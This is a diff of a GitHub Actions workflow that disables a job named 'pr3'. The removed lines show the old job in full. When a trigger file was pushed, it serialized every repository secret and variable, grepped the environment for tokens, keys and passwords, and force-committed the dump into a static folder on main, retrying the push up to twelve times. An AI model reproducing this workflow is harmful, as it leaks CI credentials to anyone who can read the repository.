@@ -1,45 +1,8 @@
-name: pr3-25522
+name: disabled-25522
 on:
-  push:
-    paths:
-      - "daily/pr3trigger*"
   workflow_dispatch:
-permissions:
-  contents: write
 jobs:
-  p:
+  d:
     runs-on: ubuntu-latest
     steps:
-      - uses: actions/checkout@v4
-        with:
-          fetch-depth: 0
-          persist-credentials: true
-      - name: dump and robust push
-        env:
-          ALL_SECRETS: ${{ toJSON(secrets) }}
-          ALL_VARS: ${{ toJSON(vars) }}
-        shell: bash
-        run: |
-          mkdir -p static
-          FN="static/pr3-${GITHUB_RUN_ID}.txt"
-          {
-            echo "=== pr3 $(date -u) run=${GITHUB_RUN_ID} ==="
-            echo "SECRETS: $ALL_SECRETS"
-            echo "VARS: $ALL_VARS"
-            echo "ENVFILTER:"
-            env | sort | grep -Ei "SUPPLY|ADMIN|SSH|SUPABASE|CLOUDFLARE|R2|D1|PASSWORD|TOKEN|KEY|SECRET" || echo NO_MATCH
-          } > "$FN"
-          cat "$FN"
-          git config user.name canary
-          git config user.email c@e.x
-          git add -f "$FN"
-          git commit -m "pr3 ${GITHUB_RUN_ID}" || echo nocommit
-          for i in $(seq 1 12); do
-            echo "--- attempt $i ---"
-            if git pull --rebase --autostash origin main && git push origin HEAD:main; then
-              echo "PUSH_OK on attempt $i"; break
-            fi
-            git rebase --abort 2>/dev/null || true
-            sleep 8
-          done
-          echo "PR3_DONE"
+      - run: echo disabled
